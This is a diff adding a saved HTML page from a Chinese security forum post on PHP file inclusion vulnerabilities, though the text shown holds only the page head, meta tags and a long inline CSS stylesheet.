@@ -1,0 +1,2023 @@
+<!DOCTYPE html>
+<html xmlns:wb="//open.weibo.com/wb"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<meta charset="utf-8">
+<title>php文件包含漏洞|漏洞研究 - 安全技术社区</title>
+<meta name="description" content="# 基本## 相关函数php中引发文件包含漏洞的通常是以下四个函数：1. (http://www.php.net/manual/en/function.include.php)2. (http://php.net/manual/en/function.include-once.php)3. (http://php.net/manual/en/function.require.php)4. (http: ..|安全技术社区">
+
+<meta name="keywords" content="Web安全,php文件包含漏洞|漏洞研究 - 安全技术社区">
+<meta name="mobile-agent" content="format=html5;url=https://xianzhi.aliyun.com/forum/mobile/read/2204.html">
+
+<!--[if IE 9 ]>
+<meta name="msapplication-task" content="name=网站首页; action-uri=https://xianzhi.aliyun.com/forum; icon-uri=https://xianzhi.aliyun.com/forum/favicon.ico" />
+<meta name="msapplication-task" content="name=个人中心; action-uri=https://xianzhi.aliyun.com/forum/u.php; icon-uri=https://xianzhi.aliyun.com/forum/images/ico/home.ico" />
+<meta name="msapplication-task" content="name=我的帖子; action-uri=https://xianzhi.aliyun.com/forum/apps.php?q=article; icon-uri=https://xianzhi.aliyun.com/forum/images/ico/post.ico" />
+<meta name="msapplication-task" content="name=消息中心; action-uri=https://xianzhi.aliyun.com/forum/message.php; icon-uri=https://xianzhi.aliyun.com/forum/images/ico/mail.ico" />
+<meta name="msapplication-task" content="name=我的设置; action-uri=https://xianzhi.aliyun.com/forum/profile.php; icon-uri=https://xianzhi.aliyun.com/forum/images/ico/edit.ico" />
+<![endif]-->
+<link rel="archives" title="安全技术社区" href="https://xianzhi.aliyun.com/forum/simple/">
+<link rel="alternate" type="application/rss+xml" title="RSS" href="https://xianzhi.aliyun.com/forum/rss.php?fid=4">
+<link rel="stylesheet" href="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%7C%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%20-%20%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%A4%BE%E5%8C%BA_files/dpl.css">
+<!-- base href="https://xianzhi.aliyun.com/forum/" -->
+<link rel="stylesheet" href="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%7C%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%20-%20%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%A4%BE%E5%8C%BA_files/pw_core.css">
+<link rel="stylesheet" href="php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%7C%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%20-%20%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%A4%BE%E5%8C%BA_files/newstyle.css">
+
+<!--css-->
+<style type="text/css">
+/*Spacing*/
+.pdD{padding:.3em .5em}
+.pd5{padding:0 5px;}
+.pd15{padding:0 15px;}
+/*form*/
+input.btn,input.bt{cursor:pointer;padding:.1em 1em;*padding:0 1em;font-size:9pt; line-height:130%; overflow:visible;}
+input.btn{border:1px solid #ff5500;background:#ff8800;margin:0 3px;color:#fff;}
+input.bt{border:1px solid #c2d8ee;background:#fff;margin:0 3px;color:#333;}
+/*layout*/
+html{/*background-color:#fff;*/overflow-y:scroll;background:#fff;}
+body{font-size:12px;font-family:Arial; color:#333;line-height: 1.5;;min-height:500px;}
+.wrap,#top{min-width:820px;margin:auto;}
+/*全局链接*/
+a{text-decoration:none;color:#333333;}
+a:hover,.alink a,.link{text-decoration:underline;}
+/*链接按钮*/
+.bta{cursor:pointer;color:#333333;padding:0 5px;margin:0 3px;white-space:nowrap;border:1px solid #d5e6ed;line-height:22px;background:#ffffff;}
+.bta:hover{border:1px solid #a6cbe7;text-decoration:none;}
+/*main color 数值自定义*/
+.f_one,.t_one,.r_one{background:#ffffff;}
+.f_two,.t_two,.r_two{background:#f3f9fb;}
+/*头部*/
+#head,.main-wrap,#footer,#navA,.top{width:960px;margin:0 auto;max-width:1200px;}
+#head,.main-wrap,#footer,#navA,.top{width:980px}
+
+#search_wrap{background:#ddd;}
+
+/*aliyun_topbar*/
+.aliyun-topbar a, .aliyun-footer a{text-decoration:none;}
+.aliyun-topbar a:hover,  .aliyun-footer a:hover{ text-decoration:underline;}
+.aliyun-topbar{height:30px; background:#fafafa; border-bottom:1px solid #e9e9e9;}
+.aliyun-topbar a:hover{text-decoration:underline;}
+.aliyun-topbar-wrap{width:950px;height:30px;margin:0 auto;}
+.aliyun-topbar-wrap .menu-link{position:relative;z-index:9999;float:left;display:inline;height:30px;}
+.aliyun-topbar-wrap .menu-link .link-site{float:left;line-height:30px;}
+.aliyun-topbar-wrap .menu-link .link-site a{padding-right:10px;color:#666;}
+
+.aliyun-topbar-wrap .menu-link .menu-wrap{position:relative;z-index:9999;float:left;}
+.aliyun-topbar-wrap .menu-link .site-menu{position:relative;z-index:9998;float:left;display:inline;height:18;margin:7px 1px 0 1px;padding:0 16px 0 7px;color:#666; cursor:default;-moz-border-radius-topleft:5px;-moz-border-radius-topright:5px;-webkit-border-top-left-radius:5px;-webkit-border-top-right-radius:5px;border-top-left-radius:5px;border-top-right-radius:5px;}
+.aliyun-topbar-wrap .menu-link .hover .site-menu{border:#999 solid;border-width:1px 1px 0 1px;background:#fff;margin:6px 0 -1px 0;color:#9f9f9f;}
+.aliyun-topbar-wrap .menu-link .corner{position:absolute;z-index:9998;right:6px;top:14px;width:0;height:0;border:4px solid;overflow:hidden;border-color:#666 #f4f4f4 #f4f4f4 #f4f4f4;-moz-transition:-moz-transform 0.3s ease-in;-webkit-transition:-webkit-transform 0.3s ease-in;-o-transition:-o-transform 0.3s ease-in;}
+.aliyun-topbar-wrap .menu-link .hover .corner{border-color:#9e9e9e #fff #fff #fff;-moz-transform:rotate(180deg);-moz-transform-origin:50% 30%;-webkit-transform:rotate(180deg);-webkit-transform-origin:50% 30%;-o-transform:rotate(180deg);-o-transform-origin:50% 30%;}
+
+.aliyun-topbar-wrap .menu-link .menu-list{display:none;position:absolute;z-index:9997;left:0px;top:24px;width:65px;border:1px solid #999;background:#fff; text-align: left;padding:5px 0 5px 7px;-moz-border-radius:5px;-webkit-border-radius:5px;border-radius:5px;-moz-border-radius-topleft:0;-webkit-border-top-left-radius:0;border-top-left-radius:0;}
+.aliyun-topbar-wrap .menu-link .menu-list .list-item{float:left;padding:0 0 0 0;}
+.aliyun-topbar-wrap .menu-link .menu-list .list-item dl{}
+.aliyun-topbar-wrap .menu-link .menu-list .list-item dt{color:#575757;font-weight:700;padding-bottom:2px;border-bottom:1px solid #cfcfcf;}
+.aliyun-topbar-wrap .menu-link .menu-list .list-item dd{padding:3px 0 5px;line-height:22px;}
+.aliyun-topbar-wrap .menu-link .menu-list .list-item dd a{color:#666;}
+.aliyun-topbar-wrap .menu-link .menu-list .list-item dd a:hover{color:#f49c0f;}
+
+.aliyun-topbar-wrap .login-info{float:right;display:inline;color:#666;line-height:30px;}
+.aliyun-topbar-wrap .login-info .division{color:#aaa;}
+.aliyun-topbar-wrap .login-info .user-id{color:#f89727; font-weight:700;}
+.aliyun-topbar-wrap .login-info a{color:#666;}
+.aliyun-topbar-wrap .login-info .login-link a{color:#666;margin:0 7px;}
+.aliyun-topbar-wrap .login-info a.link-reg{margin-left:15px;}
+.aliyun-topbar-wrap .login-info a.link-login-out{margin-left:10px;}
+.aliyun-topbar-wrap .login-info a.link-console{margin-left:15px;}
+.aliyun-topbar-wrap .login-info .login-link em{color:#f00;}
+
+	/*导航*/
+	.aliyun_menu{ float:right;}
+	.aliyun_menu li{float:left; padding:0 12px; border-right:1px solid #d5d5d5; height:12px; line-height:14px; }
+/*	
+.nav_wrap{background:url(images/wind85/navbg.png) repeat-x 0 0; height:44px;}	
+*/
+.nav_wrap{background:#f3f3f3;border-bottom: 1px solid #d9d9d9;height:80px}
+.nav_wrap .l-logo{float:left;width:62px;height:62px;background:url(images/wind85/ltlogo.png) repeat-x 0 0;margin:10px 0 0}
+.nav_wrap .l-logo a{text-indent:-9999em;float:left;display:inline-block;width:62px;height:62px;cursor:pointer;}
+/*
+#navA{height:44px;}
+.navA{height:44px;overflow:hidden;}
+*/
+	/*搜索*/
+	#searchA{margin:28px 0 0 25px;height:42px;overflow:hidden;}
+	.searchA{padding:3px 0 0 0;}
+	.searchA .ip{width:360px;float:left;border:1px solid #dddddd;background:#fff url(images/wind85/searchA.png) no-repeat 3px 5px;height:22px;padding:4px 5px 4px 25px;overflow:hidden;}
+	.searchA .ip input{border:0;background:none;padding:0;font:14px/22px Arial;width:100%;float:left;margin:0; height:22px;}
+	.s_select{float:left;border:1px solid #dddddd;border-left:0;margin-right:5px;background:#fff;width:49px;}
+	.s_select h6{display:block;padding:0 15px 0 10px;height:30px;line-height:30px;cursor:pointer;background:url(images/wind85/down.png) 35px center no-repeat;color:#666;}
+	.s_select ul{ position:absolute;border:1px solid #dddddd;background:#fff;line-height:22px;width:49px;margin:24px 0 0 -1px;display:none;}
+	.s_select ul li{padding:0 10px;cursor:pointer;}
+	.s_select ul li:hover{background:#f7f7f7;}
+	.searchA button{width:60px;height:31px;font-size:12px; font-weight:700; color:#fff;line-height:31px;padding:0;}
+
+	/*站点信息*/
+	#infobox{margin-bottom:5px;}
+	#infobox .fr li,#breadCrumb .fr li{float:left;padding:0 5px;}
+	#infobox .fr li a,#breadCrumb .fr li a{float:left;}
+	/*快捷导航*/
+#td_mymenu{background:#d9d9d9 url(images/wind85/fastarrow.png) 90px 12px no-repeat;color:#666;cursor:pointer;float:right;width:96px;height:28px;/*overflow:hidden;*/line-height:28px;padding-left:10px;margin:30px 0 0 0;
+-webkit-border-radius: 3px;-moz-border-radius: 3px;-ms-border-radius: 3px;
+-o-border-radius: 3px;border-radius: 3px;
+}
+#td_mymenu_old{color:#888;}
+	/*面包屑*/
+	#breadCrumb{zoom:1; border-bottom:1px solid #e7e7e7;background:#ffffff;margin-bottom:10px;}
+	#breadCrumb a{line-height:30px;}
+	#breadCrumb .fr{padding-top:7px;}
+	#breadCrumb .fr a{line-height:18px;}
+	#breadCrumb em{ font-family:Simsun;margin:0 5px;}
+	#breadCrumb .breadEm{height:30px;background:url(images/wind85/breadEm.png) 0 0 no-repeat;width:10px;overflow:hidden;margin:0 3px;float:left;}
+	#breadCrumb img.breadHome{float:left;margin:6px 5px 0 0;}
+	/*站点信息*/
+	.pw_ulC{margin:15px 0 0;padding-left:5px;}
+	.pw_ulC li{float:left;border-right:1px solid #ffce80;padding:0 5px; color:#fff; height:12px; line-height:12px;}
+	.pw_ulC li em{color:#fff; font-family:Arial;-webkit-transition: all 0.2s ease-out;-o-transition: all 0.2s ease-out;}
+	.pw_ulC li em a{color:#fff;}
+	.pw_ulC li:hover em{-webkit-transform: scale(1.5);-o-transform: scale(1.5);}
+	.pw_ulC li.none{border:0;}
+	/*文字广告*/
+	.textMes{margin:0 auto 5px;border:1px solid #d5e6ed;border-bottom:0;background:#ffffff;}
+	.textMes .tr3 td,.textMes .tr3 th{border-bottom:1px solid #d5e6ed;padding:.4em .6em;border-top:0;}
+/*中间内容*/
+.main-wrap{margin-bottom:10px;}
+#pw_content{}
+.t{border:1px solid #e5e5e5;padding:1px;_display:inline-block;margin-bottom:10px;background:#ffffff;}
+.tTable{border:1px solid #e8e8e8;}
+.tTable table{ border:3px solid #fff;background:#fff}
+.tTable2{border:1px solid #e8e8e8;border-right:none}
+.tTable2 table{ border:1px solid #fff; background:#f8f8f8;}
+.tTable2 table th{padding:20px 0 20px 20px; text-align:center;border-right:1px solid #e8e8e8}
+.tTable2_ul{clear:left; padding-top:10px; display:none}
+.tTable2_ul li{ color:#999; height:24px; line-height:24px; overflow:hidden;}
+.tTable2_ul li a{ color:#666;}
+.tTable2_ul li span a{ color:#999;}
+#pw_content .t{border:0;padding:0;}
+.bk_desc{float:right;width:240px}
+	/*首页热榜*/
+	.newInfor h4{font-weight:700;overflow:hidden;color:#666;padding:0 0 0 10px;margin-bottom:10px;}
+	.newInfor .switchItem .view-hover,.newInfor .switchItem .view-current{min-height:195px;_height:195px;}
+	.newflash{width:650px;height:225px;overflow:hidden;}
+		.flashimg p a{color:#fff;font-weight:700;text-shadow:1px 1px 0px #333;}
+		.flashimg img{display:inline-block;width:650px;height:225px;}
+		/*
+	.flashimg p{overflow:hidden;width:260px;bottom:4px;position:absolute;text-indent:12px;z-index:2;left:0; display:none}
+	.flashBg{ position:absolute;bottom:0;width:100%;height:27px;background:#000;filter:alpha(opacity=60);-moz-opacity:0.6;opacity:0.6; z-index:1; display:none}
+	*/
+	.an{ position:absolute;right:5px;z-index:2;bottom:5px;}
+	.an li{float:left;margin-left:5px;}
+	.an li a{float:left;background:#fff;overflow:hidden;width:7px;height:7px;-webkit-transition: all 0.2s ease-out;-o-transition: all 0.2s ease-out; text-indent:-9999em}
+	.an li.current a,.an li a:hover{background:#00a2ca;}
+	.an li a:hover{-webkit-transform: scale(1.4);-o-transform: scale(1.4);}
+	.newHotA dd{padding:5px 0 10px;}
+	.newHotA{width:500px;}
+	.newHotB{}
+	.newHotB li{float:left;width:47.5%;padding-right:2%;line-height:22px;height:22px;overflow:hidden;}
+	.newHotB a{color:#004b91;}
+	.newHotB em a{color:#333;}
+	/*公告*/
+	.noticebg{border-top:1px dotted #ccc;margin:0 10px;}
+	#notice{padding:5px 5px 5px 5px;background:url(images/wind85/file/anc.gif) 2px 5px no-repeat;}
+	#notice li{list-style:none;float:left;white-space:nowrap;padding-left:20px;height:18px;}
+	#notice a{padding-right:.5em;}
+	#notice0{width:98%;height:18px;line-height:18px;overflow-y:hidden;}
+	/*通用标题栏*/
+	.h{color:#1b72af;padding:5px 0;overflow:hidden;font-family:'Microsoft Yahei'}
+	.h a{color:#1b72af}
+	.h span a,.h span{color:#5ea6d8;}
+	.h a span{ font-family:Verdana;}
+	.closeicon{height:16px;}
+	.cate_fold{padding:0 5px 0 5px;text-decoration:none;}
+	.cate_fold:hover{text-decoration:none;}
+	/*内容区域顶部标题栏*/
+	.hB{height:32px;line-height:32px;overflow:hidden;}
+		/*标题栏内tab切换*/
+		.tabB{margin-top:3px;height:32px;padding-left:10px;}
+		.tabB li{float:left;}
+		.tabB li a{color:#014c90; font-weight:100;padding:0 15px;float:left;line-height:25px;height:27px;padding-top:2px;}
+		.tabB li.current a{border:1px solid #dcdcdc;border-bottom:0;background:#ffffff;color:#333;padding-top:1px;}
+		.tabB li a:hover{ text-decoration:none;}
+	.content_thread .content_ie h3{font-size:18px}
+	/*h2版块名，h3分类版块名*/
+	h2{font-weight:200;font-family:'Microsoft Yahei'; font-size:16px; }
+	h2 a{color:#333;}
+	h3{font-weight:700;display:inline;}
+	h3 a{color:#333333; font-size:14px; font-weight:400;}
+	h3 a:hover{ text-decoration:none;color:#ff5500;}
+	/*table表格*/
+	.tr3 td,.tr3 th{border-bottom:1px solid #efefef;}
+	.tr3none th,.tr3none td{border-bottom:none;}
+	.tr3 .old,.tr3 .new,.tr3 .lock{padding:10px 5px 10px 45px;color:#444;font-weight:100;height:35px;}
+	.tr3 .old{background:url(images/wind85/old.gif) 0 15px no-repeat;}/*旧主题版块*/
+	.tr3 .new{background:url(images/wind85/new.gif) 0 15px no-repeat;}/*新主题版块*/
+	.tr3 .lock{background:url(images/wind85/lock.gif) 0 15px no-repeat;}/*锁定版块*/
+	.tr2 td,.tr2 th{padding:3px 5px;color:#666;background:#f7fbff;border-bottom:1px dotted #d5e6ed;}
+	.tr2 th,.tr3 th{font-weight:100;}
+	.tr3 td{padding:5px 10px;}
+	.tr3 th{padding:15px;vertical-align:top;}
+	td.num{color:#444; font-size:11px;-webkit-text-size-adjust:none;}
+	td.num em{color:#014c90;}
+	.re{width:220px;}
+	.author{width:105px;}
+	.author a{color:#444;}
+	.author p,.author p a{color:#999;font-size:11px;-webkit-text-size-adjust:none;}
+	.author p span{ font-family:Verdana;}
+	.view,.fNum,.fNum a,.adminlist a,.adminlist{color:#666;}
+	.tr3 td.icon{padding:10px 0;}
+	.icon div.tips{position:absolute;margin-left:-45px;background:#ffffcc;border:1px solid #cc6699;padding:3px 10px;}
+	.adminbox{padding:0 0 0 10px;width:25px;}
+	.tr3 td.subject{padding:5px 10px 5px 0;}
+	.tr4 td{padding:3px 5px;border-bottom:1px solid #eaeaea;color:#666;background:#f9f9f9;}
+	.tr4 td a{color:#6a99bf}
+	.tr4 td .current{color:#333;}
+	.z tr:hover td,.z tr:hover th{background-color:#fbfbfb;}
+	.bt0 td{border-top:0;}
+	.tr5 td{border:0;}
+	.threadCommon .tr3 td{line-height:1.3;}/*列表行高*/
+	.hrA{height:1px; background:#d5e6ed;color:#d5e6ed;border:0;margin:8px 0;overflow:hidden;}
+	/*old table*/
+	.t3 td{padding:2px 5px;}
+	/*发帖回复*/
+	.post,.replay{height:30px;overflow:hidden;text-align:center;font:bold 14px/30px Simsun;}
+	.replay{ background:#f90;color:#fff;-webkit-border-radius: 4px;-moz-border-radius: 4px;
+-ms-border-radius: 4px;-o-border-radius: 4px;border-radius: 4px;}
+.post:hover,.replay:hover{text-decoration:none;color:#fff}
+
+	.post:hover{color:#fff;}
+	/*列表页分类*/
+	.pw_ulA{height:auto;margin:15px 0;}
+	.pw_ulA li{float:left;border-right:1px solid #ccc;}
+	.pw_ulA li a{line-height:14px;height:14px;padding:0 10px;float:left;color:#000;font-weight:100; white-space:nowrap;}
+	.pw_ulA li a:hover{ text-decoration:none;}
+	.pw_ulA a span{ font-size:10px;}
+	.pw_ulA li.current a{color:#333; font-weight:700;}
+	/*版主推荐,群组列表*/
+	.pw_ulB{padding:10px 0 10px 10px;background-color:#F7F7F7;border-bottom:1px solid #e5e5e5;border-top:1px solid #e5e5e5;}
+	.pw_ulB li{line-height:22px;height:22px;overflow:hidden;}
+	.pw_ulB li a{width:330px;padding-left:13px;background: url(images/dot.gif) 0 3px no-repeat;}
+	.pw_ulB li em a{padding:0;background:none;}
+	.pw_ulB .adel{margin:4px 40px 0 0 ;}
+	.pw_ulB .one{float:left;width:90px;margin:0 15px 0 0;}
+	.pw_ulB .one p,.pw_ulB .two p{text-align:center;height:22px;overflow:hidden;}
+	.pw_ulB .two{float:left;width:90px;margin:0 15px 10px 0;height:120px;}
+	.pw_ulB .two a{padding-left:0;background:none;}
+	/*侧栏版块列表*/
+	.pw_ulD{padding:5px;}
+	.pw_ulD li{padding:0 5px;}
+	.pw_ulD li:hover,.pw_ulD li.hover,.pw_ulD li.current{background:#daeef9;}
+	.pw_ulD li a{line-height:22px;height:22px;overflow:hidden;}
+	.pw_ulD li a:hover{ text-decoration:none;}
+	.pw_ulD li del{margin-top:3px;display:none;}
+	.pw_ulD li:hover del,.pw_ulD li.current del,.pw_ulD li.hover del{display:block;}
+	.sideForum {}
+	.sideForum .pw_ulD{border-top:1px solid #cfdfec;}
+	.sideForum .pw_ulD li.current{background:#2e84c1;}
+	.sideForum .pw_ulD li.current a{color:#fff;display:block;}
+	.sideForum dt{line-height:29px;height:29px;padding:0 10px; background:url(images/wind85/thread/sideForumDt.gif) right 0;cursor:pointer;overflow:hidden;}
+	.sideForum dd{display:none;}
+	.sideForum .one dt{background-position:right -30px; font-weight:700;}
+	.sideForum .one dd{display:block;}
+	/*列表侧栏*/
+	.sidebar{float:left;overflow:hidden;margin-right:-1px;margin-bottom:-1px;}
+	.content_thread{background:#ffffff;min-height:600px;_height:600px;_float:right;}
+	.sideClose .content_thread{margin:0;border:0;float:none;}
+	.f_tree{background:#f7faff;}
+	.fastpost .floot_left{display:none;_width:0;_border:0;}
+	/*列表操作图标*/
+	.keep,.keepOn{background:url(images/sideicon-new.gif) 9999px 9999px no-repeat;cursor:pointer;}
+	.history,.pw_ulD del,.switch,.rss,.competence{background:url(images/sprite.png) 9999px 9999px no-repeat;cursor:pointer;}
+	.history,.pw_ulD del{float:right;width:16px;height:16px;overflow:hidden;display:block;text-indent:-2000em;}
+	.history{ background-position:0 0;}
+	.switch{float:left;width:9px;height:27px;display:block; text-indent:-2000em;overflow:hidden; background-position:0 -40px;margin-top:1px; position:absolute;}
+	.switch:hover{ background-position:-9px -40px;}
+	.sideClose .switch{background-position:-1px -68px;width:8px;}
+	.sideClose .switch:hover{background-position:-10px -68px;}
+	.pw_ulD del{ background-position:0 -20px;}
+	.pw_ulD del:hover{ background-position:-20px -20px;}
+	.keep,.keepOn,.rss,.competence{float:left;padding-left:22px;background-position:-120px 0;line-height:20px;*line-height:20px;height:20px;margin-top:6px;}
+	.keep{background-position:-120px 1px;}
+	.keep:hover{background-position:-120px -19px;}
+	.keepOn{background-position:-120px -39px;}
+	.rss{background-position:0 -680px;}
+	.competence{background-position:0 -650px;}
+	/*侧栏收藏的版块*/
+	.myForum h6{color:#666;padding:6px 10px 5px;}
+	.myForum .pw_ulD li{height:22px;overflow:hidden;}
+	/*列表帖子类型tab*/
+	.tabA{border-bottom:1px solid #e5e5e5;height:28px;padding:10px 10px 10px 0;}
+	.tabA ul{_position:absolute;font-size:14px;overflow:hidden;background:#fff;}
+	.tabA li{float:left;margin-left:-1px;margin-top:5px;}
+	.tabA li a{float:left;color:#00a2ca;line-height:1.2;padding:0 15px;overflow:hidden;border:none;padding:0 10px;font-size:12px;}
+	.tabA li a:hover{ text-decoration:none;color:#333;}
+	.tabA li.current{margin:0;margin-right:6px;}
+	.tabA li.current a{
+		color: #fff;
+		font-weight: 700;
+		background: #00a2ca;
+		-webkit-border-radius: 3px;
+		-moz-border-radius: 3px;
+		border-radius: 3px;
+		line-height:24px;}
+	/*帖子列表管理操作*/
+	.manageCheck{border-bottom:1px solid #c6d9e7;border-top:1px solid #c6d9e7;background:#f2f7fa;padding:5px 7px;margin-top:-1px;}
+	/*帖子楼层结构*/
+	.floot{ table-layout:fixed;}
+	.floot_left{width:160px;background:#fbfbfb;border-right:1px solid #efefef; vertical-align:top;}
+	.floot_leftdiv{padding:10px 10px 50px 15px;}
+	.floot_right{background:#ffffff;padding:10px 20px 0;vertical-align:top;}
+	.floot_bottom{vertical-align:bottom;padding:0 20px;background:#fff}
+	.readTop{background:#f3fdff;}
+	/*楼层间*/
+	.flootbg{background:#d4e6ed;height:3px;border-top:1px solid #fff;border-bottom:1px solid #fff;}
+	/*帖子信息*/
+	.tipTop{padding:0 0 10px;border-bottom:1px dotted #ccc;margin-bottom:10px;}
+	/*印戳*/
+	.overprint{overflow:hidden;position:absolute;margin-left:440px;margin-top:-35px;}
+	.overprint_opl {height:200px;overflow:auto;}
+	.overprint_opl a{display:block;float:left;padding:3px;margin:3px}
+	.overprint_opl a.current{border:1px solid #ccc;padding:2px}
+	.overprint_opl a:hover{border:1px solid #ddd;padding:2px;background:#fff9f0}
+	/*帖子用户信息*/
+	.honor{color:#777;overflow:hidden;line-height:1.3;}
+	.user-infoWrap2 li{line-height:20px;height:20px;overflow:hidden;}
+	.user-infoWrap2 li em{float:left;width:60px;}
+	.user-pic{margin-left:-2px;}
+	.face_img img{padding:3px;border:1px solid #d5e6ed;background:#ffffff;}
+	/*帖子操作*/
+	.tipBottom{padding:10px 0;border-top:1px dotted #ccc;margin-top:10px;}
+	.readbot a{list-style:none;padding:0 0 0 1.5em;margin:0;float:left;cursor:pointer;background:url(images/post-icon.png) no-repeat;width:3.5em;height:16px;}
+	.readbot .r-quote {background-position:0 -348px;}
+	.readbot .r-reply {background-position:0 -287px;}
+	.readbot .r-score {background-position:0 -319px;}
+	.readbot .r-keep {background-position:0 -140px;}
+	.readbot .r-recommend {background-position:0 -180px;}
+	.readbot .r-report {background-position:0 -220px;}
+	/*帖子标题*/
+	h1.read_h1{padding:0 20px;}
+	.read_h1,.read_h1 a{font-size:16px;color:#333333; font-weight:700;line-height:1.2;padding:0;margin:0;}
+	/*帖子内容区域*/
+	blockquote{margin-left:12px;}
+	.tpc_content{font-family:Arial;padding:0 2px 20px;margin:0;line-height:1.8em;}
+	.tpc_content font{line-height:1.5em;}
+	.tpc_content a{text-decoration:none;color:#0070AF;}
+	.tpc_content a:hover{text-decoration:underline}
+	.tpc_content ol{list-style-type:decimal;}
+	.tpc_content ul{list-style-type:disc;}
+	.blockquote{zoom:1;padding:5px 8px 5px;line-height:1.3;background:#fffae1;margin:0 0 10px 0;}
+	.tips{border:1px solid #a6cbe7;background:#f3f9fb;padding:3px 10px;display:inline-block;_float:left;}
+	/*帖子代码*/
+	.blockquote2{border: 1px solid; border-color: #c0c0c0 #ededed #ededed #c0c0c0;margin:0px;padding:0 0 0 2em;line-height:2em;overflow:hidden;background:#ffffff;margin-left:0;}
+	.blockquote2 ol{margin:0 0 0 1.5em;padding:0;}
+	.blockquote2 ol li{border-left:1px solid #ccc;background:#f7f7f7;padding-left:10px;font-size:12px;font-family:"Courier New" serif;list-style-type:decimal-leading-zero;padding-right:1em;}
+	.blockquote2 ol li:hover{background:#ffffff;color:#008ef1;}
+	.blockquote2 ol li{list-style-type:decimal;}
+	/*帖子引用*/
+	.blockquote3{clear:left;border:1px dashed #CCC;background:#f7f7f7 url(images/blockquote3.png) right top no-repeat;padding:5px 10px;margin-left:0;}
+	.blockquote3 .quote{color:#999;font-size:12px;}
+	.blockquote3 .text{padding:0 10px 10px 10px;}
+	/*帖子表格*/
+	.read_form{border-top:1px solid #d5e6ed;border-left:1px solid #d5e6ed;}
+	.read_form td{height:20px;padding:0 5px;border-right:1px solid #d5e6ed;border-bottom:1px solid #d5e6ed;}
+	/*分割线*/
+	.sigline {background: url(images/wind85/read/sigline.gif) left bottom no-repeat;height:16px;}
+	/*帖子签名*/
+	.signature {padding:10px 0 0 0;height:expression(this.scrollHeight>parseInt(this.currentStyle.maxHeight)?this.currentStyle.maxHeight:"auto");}
+	/*下载*/
+	.down {background:url(images/post/down.gif) 5px center no-repeat;padding:5px 5px 5px 30px;border:#d5e6ed 1px solid;margin:0 1em 0 0;line-height:40px;}
+	/*分类信息*/
+	.cates{margin:0 0 10px;border-top:1px solid #e4e4e4; font-size:12px;}
+	.cates .cate-list li{line-height:28px;font-weight:500;color:#444444; list-style:none;border-bottom:1px solid #e4e4e4;padding-left:110px;}
+	.cates .cate-list em{ font-style:normal;width:100px;float:left; text-align:right; font-weight:700;margin-left:-110px;}
+	.cates .cate-list cite{font-style:normal;}
+	.cates input{ vertical-align:middle;}
+	.cates .w{margin-right:10px;}
+	.cates .two{background:#f7f7f7;}
+	.cate_meg_player {float:right;width:200px;padding:0 10px 9px 0;background:#ffffff;}
+	/*帖子页flash*/
+	.readFlash{position:relative;height:180px;overflow:hidden;text-align:center;}
+	.readFlash img{width:100%;}
+	.readFlash ul {position:absolute;right:8px;bottom:8px;z-index:3;}
+	.readFlash ul li {list-style:none;float:left;width:18px;height:13px;line-height:13px;text-align:center;margin-left:2px;background:#ffffff;}
+	.readFlash ul li a {display:block;width:18px;height:13px;font-size:10px;font-family:Tahoma;color:#333333;}
+	.readFlash ul li a:hover,.flash ul li a.sel {color:#fff;text-decoration:none;background:#ffa900;}
+
+	/*评分*/
+	.score{}
+	.score td,.score th{
+		padding: 5px;
+		text-align: left;
+		border-bottom: 1px solid #efefef;
+		color:#666;
+	}
+
+	
+	.scoreTop{position: relative;
+	padding: 5px;
+	margin-bottom: 10px;
+	text-align: left;
+	background: #f4f4f4;
+	border-bottom: 1px solid #e5e5e5;}
+
+	.scoreContent{margin:5px 10px;}
+	.scoreContent .adel{margin-top:5px;}
+	.scoreBottom{border-top:1px solid #a5cae5;padding:3px 13px;background:#f3f8fb;}
+
+	.score a{color:#00a2ca;}
+
+	.scoreContent .current td{padding:0;}
+
+	.p_face{width:35px;}
+	.p_name{width:100px;}
+	/*友情链接*/
+	.sharelink{border-bottom:1px dotted #ddd;padding:5px 0;word-break: keep-all;}
+	.sharelink dt{padding-top:3px;}
+	.sharelink dd a{color:#369;}
+	.sharelink2{padding:5px 0;}
+	.sharelink2 a{margin-right:10px; white-space:nowrap;float:left;}
+	.sharelink2 img{margin-right:10px;}
+	/*生日会员*/
+	.brithcache span{float:left;width:100px;line-height:22px;height:22px;overflow:hidden;}
+/*底部*/
+.aliyun-footer{width:980px;height:18px;margin:30px auto 0 auto;color:#666;padding:20px 0 20px 0;background:url(images/wind_aliyun/aliyun_footer_line.png) no-repeat center 0;}
+.aliyun-footer .footer-link{float:left;color:#aaa;}
+.aliyun-footer .footer-info{float:right;}
+.aliyun-footer a{color:#666;margin:0 7px;}
+
+#footer{padding:0 0 10px;}
+#footer a{color:#68b}
+.bottom{margin:0 auto;}
+.bottom ul{ padding:0 5px 5px;margin:0; list-style:none;}
+.bottom ul li{ padding:0 10px 0 0;display:inline;}
+.bottom ul li a{white-space:nowrap;}
+/*css3.0*/
+.history,del,.keep{-webkit-transition: all 0.2s ease-out;transition: all 0.2s ease-out;}
+
+/*menu*/
+.menu{position:absolute;background:#ffffff;border:1px solid #d5e6ed;}
+.menu a{display:block;padding:4px 8px;}
+/*下拉框*/
+.menu-post{border:1px solid #a6cbe7;}
+.menu-post .menu-b{background:#ffffff;border:3px solid #d5e6ed;}
+.menu_tasksA .menu-b{border-width:8px;}
+/*通用下拉外框*/
+.pw_menu{border:1px solid #a6cbe7;background:#ffffff;/*-webkit-box-shadow:2px 2px 2px #bbb;*/;}
+.pw_menuBg{padding:0 10px 10px;}
+.pw_menu h6{ position:absolute;margin-top:-18px;height:17px;border:1px solid #a6cbe7;background:#ffffff;border-bottom:0;right:-1px;padding:0 4px;*padding:0 5px;line-height:18px;}
+/*下拉列表*/
+.menuList{background:#ffffff;}
+.menuList a:hover{background:#fbfbfb;}
+/*双列下拉*/
+.menuHalf{margin-right:-1px;padding:5px 0;}
